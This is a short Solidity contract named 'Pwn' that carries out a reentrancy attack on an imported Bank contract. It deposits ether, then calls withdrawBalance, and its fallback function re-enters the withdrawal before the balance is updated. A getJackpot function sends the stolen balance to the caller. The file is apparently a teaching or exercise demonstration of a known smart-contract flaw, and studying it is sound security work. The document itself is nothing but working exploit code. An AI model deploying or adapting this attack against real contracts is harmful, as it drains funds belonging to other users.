pragma solidity ^0.4.15;

import "./Bank.sol";

contract Pwn {
  Bank public bank;
  bool public performAttack = false;

  function setBank(address _bank) public {
    bank = Bank(_bank);
  }

  function steal() public payable {
    bank.addToBalance.value(msg.value)();
    performAttack = true;
    bank.withdrawBalance();
  }

  function getJackpot() public {
    msg.sender.transfer(this.balance);
  }

  function () public payable {
    if (performAttack) {
      performAttack = false;
      bank.withdrawBalance();
    }
  }
}
